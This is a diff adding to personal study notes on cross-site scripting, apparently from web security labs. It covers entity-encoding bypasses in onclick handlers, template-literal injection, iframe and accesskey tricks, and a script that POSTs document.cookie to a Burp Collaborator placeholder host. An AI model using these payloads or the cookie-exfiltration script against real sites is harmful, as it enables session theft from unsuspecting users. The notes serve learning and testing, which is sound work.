@@ -5,8 +5,25 @@ exploitation
 - if you found xss try to find failure to invalidate session on logout
 - 
 
+##### encoding and escaping 
+###### scenario 1 
+in this scenario the single quote is escaped every `'` has `\` that is escaping it and 
+trying to escape the back slash didn't work what if we brake the validation on `'` by encoding the characters HTML encoding so we where able of bypassing the validation why ?????
+- because that the server didn't decode the user input before it passes to the client browser 
+```javascript
+<a id="author" href="https://google.com" onclick="var tracker={track(){}};tracker.track('https://google.com');">joe</a>
+```
+so trying to brake the `'` and try to inject payload in the track function  
+by using  `http://goo&apos;-alert(1)-&apos;`
+so the returned value from the server will be like that 
+```html 
+<a id="author" href="[http://goo&apos;-alert(1)-&apos;](http://goo'-alert\(1\)-'/)" onclick="var tracker={track(){}};tracker.track('http://goo&apos;-alert(1)-&apos;');">youssef</a>
+```
+but stoop here for a sec shouldn't the browser deals with the encoded value as a string (encoded it and use it as a string ) why this payload works then ??/
+- the answer is the data is decoded inside a java script function (code) that's why the payload works 
 
 
+###### scenarion2 
 ##### htmlentities
 ```html
 <a href='/profile/<?php echo htmlentities($user); ?>'></a>
@@ -128,7 +145,20 @@ To make the XSS payload execute automatically without user interaction (e.g., ho
     
 4. **URL Crafting**: The final malicious URL includes the `#x` fragment, which causes the browser to focus on the custom tag with `id="x"` as soon as the page loads, triggering the `onfocus` event and executing the JavaScript payload (e.g., `alert(document.cookie)`).
 
+
+
+
+##### Reflected XSS into a Template Literal 
+Reflected Cross-Site Scripting (XSS) occurs when user input is directly embedded into a web page without proper sanitization, allowing attackers to inject malicious scripts. When the vulnerable input is included within a **template literal** (JavaScript's backtick-delimited strings with `${}` placeholders), the embedded expressions are evaluated as JavaScript code. If an attacker injects a payload like `${alert(1)}`, the `alert` function (or any other malicious code) will execute because template literals dynamically evaluate expressions. This vulnerability arises when user input is unsafely embedded into template literals, enabling arbitrary JavaScript execution. To prevent this, sanitize user input, avoid embedding untrusted data in template literals, and use output encoding or Content Security Policies (CSP) to mitigate risks.
+
+##### sending the cookies to self host 
+```java script
+<script> 
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN',
+{ method: 'POST', mode: 'no-cors', body:document.cookie }); 
+</script>
+```
 ##### notes 
 - what if you want to to make the severity of you xss  high and not demand user interaction but only a few tags are allowed like `onresize` so we need auto resize script so if we found that the page allows me to use it in `iframes` so we can use code like that 1. `<iframe src="https://vulnerablePage?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`
 - even if the element isn't visible in the web site it still be vulnerable to XSS for ex  the website takes the URL and put it in `a` tag in the `head` so it's not visible so we can use that payload `https://victim.com?'accesskey='x'onclick='alert(1)` so when the user press ALT +X the payload will execute  '
--  '
+-  
